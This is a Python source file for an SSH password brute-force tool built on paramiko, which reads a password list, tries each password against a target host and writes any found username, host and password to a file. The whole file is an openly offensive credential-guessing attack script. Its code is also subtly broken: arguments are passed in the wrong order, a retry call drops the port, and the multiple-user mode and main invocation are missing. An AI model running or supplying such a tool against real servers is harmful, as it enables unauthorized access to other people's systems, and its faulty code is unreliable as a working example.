from paramiko import AuthenticationException, SSHClient, AutoAddPolicy, SSHException
import socket
import time
import argparse
from threading import Thread
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE


def ssh_checker(hostname, username, password, port):
    c = SSHClient()
    c.set_missing_host_key_policy(AutoAddPolicy())
    try:
        c.connect(hostname=hostname, username=username, password=password, port=port)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        time.sleep(60)
        return ssh_checker(hostname, username, password)
    else:
        print(
            f"{GREEN}[+] Found combination: \n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n"
            f"\tPASSWORD: {password}{RESET} "
        )
        return True


def single_target_mode(plist, host, user, port):
    with open(plist) as read_list:
        take_from_list = read_list.read().splitlines()

    for password in take_from_list:
        if ssh_checker(password, host, user, port):
            with open("credential_pairs.txt", "w") as w:
                w.write(f"{user}@{host}: {password}")
                break


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Bruteforce script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server.")
    parser.add_argument(
        "-w", "--passlist", help="File that contain password list in each line."
    )
    parser.add_argument(
        "-U", "--userlist", help="File that contain username list in each line."
    )
    parser.add_argument("-u", "--user", help="Login username")
    parser.add_argument("-p", "--port", help="SSH port number")
    parser.add_argument(
        "-s",
        "--singletarget",
        help="Brute force attack against one specified user name.",
    )
    parser.add_argument(
        "-m", "--mutlipletarget", help="Brute force attack against listed users."
    )

    args = parser.parse_args()
    hostIP = args.host
    pass_list = args.passlist
    user_name = args.user
    port_num = args.port
